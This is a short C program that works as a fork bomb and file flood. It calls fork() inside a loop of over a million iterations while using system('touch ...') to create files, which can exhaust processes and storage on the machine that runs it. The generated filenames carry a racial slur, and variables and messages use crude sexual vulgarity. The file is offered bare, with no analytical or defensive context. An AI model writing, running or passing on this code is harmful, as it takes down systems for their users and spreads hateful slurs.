#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

int main(int argc, char** argv) {
	int start = 0;
	size_t penis = atoi(argv[1]);
	penis = 1234567;
	FILE* sex;
	char filename[97];
	char cmd[100];
	//snprintf(cmd, sizeof(cmd), "touch nigger%d", start);
	snprintf(filename, sizeof(filename), "nigger%d", start);
	for  (size_t i = 1; i <= penis; i++) {
		printf("you have been penised\n");
		sex = fopen(filename, "w");
		snprintf(cmd, sizeof(cmd), "touch nigger%d", start);
		start++;
		system(cmd);
		fork();
	}
	if (sex == NULL) {
		printf("fuck");
	}
	return 0;
}
